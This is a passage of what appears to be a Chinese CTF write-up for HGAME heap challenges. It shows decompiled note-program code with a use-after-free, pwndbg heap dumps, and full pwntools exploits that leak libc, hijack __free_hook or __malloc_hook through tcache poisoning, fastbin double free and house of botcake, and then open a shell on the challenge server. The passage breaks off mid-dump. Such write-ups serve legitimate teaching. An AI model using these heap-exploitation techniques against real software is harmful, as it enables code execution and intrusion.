note_size[v2] = size[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too big.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>delete中出现<code>uaf</code>漏洞：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">delete_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">free</span>(notes[v2]);<span class="comment">// uaf漏洞</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>edit：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, notes[v2], note_size[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">puts</span>(notes[v2]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请9个<code>unsortedbin</code>大小的堆，释放前8个，其中7个进入<code>tcachebin</code>，1个进入<code>unsortedbin</code>，第9个堆用于避免被<code>topchunk</code>吸收。</li><li>打印得到<code>libc</code>地址，计算<code>__free_hook</code>和<code>system</code>。</li><li>修改第6个堆的<code>fd</code>指针指向<code>__free_hook</code>。</li><li>再申请2个堆，劫持<code>__free_hook</code>为<code>system</code>。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31047</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p><code>libc2.23</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样，因此可以构造<code>double free</code>。</p><ul><li>申请两个堆，第一个有<code>unsortedbin</code>大小，释放第一个，泄露<code>libc</code>。</li><li>再申请两个数据大小为<code>0x60</code>的堆，释放其中第一个，再释放第二个，再释放第一个，绕过检查，达成<code>double free</code>。</li><li>再申请一个数据大小为<code>0x60</code>的堆，并修改其<code>fd</code>指向<code>__malloc_hook-0x23</code>处。</li><li>将<code>__malloc_hook-0x23</code>处的堆块申请过来，修改<code>__malloc_hook</code>为<code>one_gadget</code>，必要时用<code>realloc</code>进行调整。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30160</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">104</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log,success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">gadgets=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base+gadgets[<span class="number">3</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h3><p><code>libc2.31</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样。由于引入了<code>tcache</code>，这里学习了一种新的<code>double free</code>利用手法<code>house of botcake</code>。<a href="https://www.cnblogs.com/brain-Z/p/16853137.html">参考文章</a></p><ul><li>分配9个<code>unsortedbin</code> 大小的堆块，释放掉前7个，再申请一个保护堆块防止合并。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>释放掉第9个堆块。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6710</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6710</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><ul><li>释放掉第8个堆块，触发<code>unsortedbin consolidate</code>合并为一个大堆块。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x563c55bf6680</span></span><br><span class="line"><span class="number">0x563c55bf6680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000121</span></span><br><span class="line"><span class="number">0x563c55bf6690</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf66a0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66b0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66c0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66d0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66e0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66f0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6700</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x563c55bf6720</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf6730</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6740</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6750</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6760</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure><ul><li>申请一个堆块(Tcache优先)，再释放掉第9个堆块，此时两个指针分别位于<code>unsortedbin</code>中和<code>tcache</code>中，完成了<code>double free</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>只需申请一个比第9个堆块大的堆块，便能切割<code>unsortedbin</code>，在第9个堆块处的<code>fd</code>指针留下<code>__free_hook</code>即可。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span 